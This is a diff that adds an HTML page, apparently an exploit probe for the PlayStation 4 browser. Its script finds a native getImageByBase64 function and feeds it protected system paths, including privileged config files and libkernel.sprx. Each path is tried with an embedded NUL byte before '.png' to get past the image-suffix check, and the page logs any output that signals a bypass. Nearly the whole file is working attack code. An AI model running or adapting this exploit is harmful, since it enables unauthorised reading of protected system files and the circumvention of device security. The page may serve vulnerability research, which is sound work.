@@ -1,0 +1,105 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>PS4 getImageByBase64 NUL suffix probe</title>
+<style>
+  body { font-family: sans-serif; margin: 24px; background: #111; color: #eee; }
+  button { font: inherit; padding: 10px 14px; margin: 4px; }
+  pre { white-space: pre-wrap; background: #1d1d1d; padding: 12px; border: 1px solid #444; }
+</style>
+<h1>getImageByBase64 NUL suffix probe</h1>
+<p>This page checks whether getImageByBase64 accepts an embedded NUL before an allowed image suffix.</p>
+<button id="run">Run probe</button>
+<pre id="log"></pre>
+<script>
+const log = (line) => {
+  document.getElementById("log").textContent += line + "\n";
+};
+
+const candidates = [
+  "/system/priv/etc/index.dat",
+  "/system_ex/etc/index.dat",
+  "/system/priv/bgdc_ro/config.xml",
+  "/system/priv/updater_ro/config.xml",
+  "/system/common/lib/libkernel.sprx"
+];
+
+function findCallable() {
+  const roots = [
+    navigator.sce,
+    navigator.sce && navigator.sce.native,
+    window.sce,
+    window.SceNative
+  ].filter(Boolean);
+
+  for (const root of roots) {
+    if (typeof root.getImageByBase64 === "function") {
+      return { root, fn: root.getImageByBase64, name: "getImageByBase64" };
+    }
+  }
+  return null;
+}
+
+async function invoke(callable, path) {
+  return await new Promise((resolve) => {
+    let settled = false;
+    const done = (value) => {
+      if (!settled) {
+        settled = true;
+        resolve({ ok: true, value });
+      }
+    };
+    const fail = (error) => {
+      if (!settled) {
+        settled = true;
+        resolve({ ok: false, error: String(error && (error.stack || error.message || error)) });
+      }
+    };
+
+    try {
+      const result = callable.fn.call(callable.root, path, done, fail);
+      if (result && typeof result.then === "function") {
+        result.then(done, fail);
+      } else if (result !== undefined) {
+        done(result);
+      } else {
+        setTimeout(() => {
+          if (!settled) resolve({ ok: false, error: "no synchronous result; callback may not have fired yet" });
+        }, 5000);
+      }
+    } catch (e) {
+      fail(e);
+    }
+  });
+}
+
+document.getElementById("run").onclick = async () => {
+  document.getElementById("log").textContent = "";
+  log("navigator.sce type: " + typeof navigator.sce);
+  if (navigator.sce) log("navigator.sce keys: " + Object.keys(navigator.sce).join(", "));
+
+  const callable = findCallable();
+  if (!callable) {
+    log("No directly callable getImageByBase64 found. Inspect navigator.sce above.");
+    return;
+  }
+
+  log("Using callable: " + callable.name);
+  for (const base of candidates) {
+    const normal = base;
+    const nulSuffixed = base + "\u0000.png";
+
+    log("\nTesting normal path: " + JSON.stringify(normal));
+    let result = await invoke(callable, normal);
+    log(JSON.stringify(result).slice(0, 800));
+
+    log("Testing NUL-suffixed path: " + JSON.stringify(nulSuffixed));
+    result = await invoke(callable, nulSuffixed);
+    const text = JSON.stringify(result);
+    log(text.slice(0, 1200));
+
+    if (text.includes("base64") || text.includes("mimetype")) {
+      log("Potential bypass signal: NUL-suffixed path produced image-style output.");
+    }
+  }
+};
+</script>
